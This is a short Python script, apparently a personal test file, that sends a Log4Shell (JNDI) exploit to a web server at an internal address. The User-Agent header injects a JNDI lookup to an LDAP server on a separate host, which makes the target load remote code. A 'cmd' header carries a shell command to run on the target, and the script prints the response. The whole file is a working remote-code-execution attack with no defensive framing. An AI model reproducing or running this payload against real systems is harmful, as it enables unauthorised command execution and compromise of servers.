# -*- coding:utf8 -*- #
# -----------------------------------------------------------------------------------
# ProjectName:   Jakiro_pro
# FileName:     function_demo.py
# Author:      Jakiro
# Datetime:    2021/12/23 10:09
# Description:
# 命名规则  文件名小写字母+下划线，类名大驼峰，方法、变量名小写字母+下划线连接
# 常量大写，变量和常量用名词、方法用动词
# -----------------------------------------------------------------------------------


import requests
import os

see = requests.session()

headers = {"User-Agent": '${jndi:ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho}',
           'cmd': 'll /Users/yejie/tools'}
resp = see.get(r'http://10.10.30.171:8088/index', headers=headers)
# print(os.open())
print(resp.text)